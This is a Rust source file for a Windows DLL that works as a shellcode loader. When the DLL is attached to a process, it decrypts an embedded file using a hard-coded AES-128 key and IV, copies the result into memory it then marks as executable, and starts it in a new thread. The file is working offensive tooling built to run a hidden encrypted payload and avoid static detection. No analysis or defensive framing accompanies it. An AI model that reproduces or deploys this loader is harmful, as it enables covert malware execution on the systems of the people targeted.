use std::{ptr, ffi::c_void};
use aes::cipher::block_padding::Pkcs7;
use aes::cipher::{KeyIvInit, BlockDecryptMut};
use windows::Win32::Foundation::CloseHandle;
use windows::Win32::System::Memory::{PAGE_READWRITE, MEM_RESERVE};
use windows::Win32::System::SystemServices::{DLL_THREAD_ATTACH, DLL_PROCESS_DETACH, DLL_THREAD_DETACH};
use windows::Win32::{Foundation::{HINSTANCE, BOOL, HANDLE}, System::{SystemServices::DLL_PROCESS_ATTACH, Memory::{VirtualAlloc, MEM_COMMIT, VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS}, Threading::{CreateThread, THREAD_CREATE_RUN_IMMEDIATELY, WaitForSingleObject}}};

#[no_mangle]
#[allow(non_snake_case)]
fn DllMain(_hinst: HINSTANCE, fdwReason: u32, _lpvReserved: c_void) -> BOOL {
    match fdwReason {
        DLL_PROCESS_ATTACH => go_run(),
        DLL_THREAD_ATTACH => return BOOL(1),
        DLL_PROCESS_DETACH => return BOOL(1),
        DLL_THREAD_DETACH => return BOOL(1),
        _ => return BOOL(0),
    };
    return BOOL(1);
}

fn resolve_data() -> Vec<u8> {
    let mut data = include_bytes!("myfile.txt").to_owned(); 

    let key: [u8;16] = [0xf4,0xc5,0x0e,0x62,0x58,0x43,0xb8,0xd9,0x37,0x2d,0x42,0xb4,0xb5,0x65,0x51,0xc6];
    let iv: [u8;16] = [0xbb,0xdb,0xc4,0x18,0x91,0xbf,0x83,0x28,0x01,0x35,0xb5,0xbd,0x79,0xf8,0x9c,0xf8];

    type Aes128CbcDec = cbc::Decryptor<aes::Aes128>;
    let ddata = Aes128CbcDec::new(&key.into(), &iv.into()).decrypt_padded_mut::<Pkcs7>(data.as_mut_slice()).unwrap();
    return ddata.to_vec();
}

fn go_run() -> BOOL {
    let data: Vec<u8> = resolve_data();
    let bytes_len: usize = data.len();
    unsafe {

        let exec_mem: *mut c_void = VirtualAlloc(Some(ptr::null_mut()), bytes_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


        ptr::copy(data.as_ptr(), exec_mem as _, bytes_len);


        let mut old_protect: PAGE_PROTECTION_FLAGS = PAGE_READWRITE;

        VirtualProtect(exec_mem, bytes_len, PAGE_EXECUTE_READ, &mut old_protect);

        let mut thread_id: u32 = 0;

        let nm: unsafe extern "system" fn(*mut c_void) -> u32 = std::mem::transmute(exec_mem);

        let h_thread: HANDLE = CreateThread(Some(ptr::null_mut()), 0, Some(nm), Some(ptr::null()), THREAD_CREATE_RUN_IMMEDIATELY, Some(&mut thread_id)).unwrap();


        if thread_id != 0 {
            WaitForSingleObject(h_thread, 500);
            CloseHandle(h_thread);
        }

    }
    return BOOL(1);
}